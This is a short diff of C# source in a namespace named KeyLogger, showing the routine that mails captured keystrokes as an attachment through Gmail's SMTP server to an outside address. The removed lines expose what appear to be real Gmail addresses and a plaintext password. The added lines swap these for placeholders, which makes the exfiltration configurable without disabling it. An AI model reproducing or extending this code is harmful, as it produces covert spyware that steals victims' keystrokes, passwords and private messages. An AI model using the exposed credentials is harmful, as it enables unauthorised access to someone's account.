@@ -99,8 +99,8 @@ namespace KeyLogger
             {
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                mail.From = new MailAddress("minecraftlunher@gmail.com");
-                mail.To.Add("anonymousekeyloggerxd@gmail.com");
+                mail.From = new MailAddress("email-from-save-key-words");
+                mail.To.Add("email-to-save-key-words");
                 mail.Subject = "Saved keys from " + date;
                 mail.Body = "Keystrokes saved from user " + user;
 
@@ -109,7 +109,7 @@ namespace KeyLogger
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("minecraftlunher@gmail.com", "Kolikos01");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email", "password-to-email");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
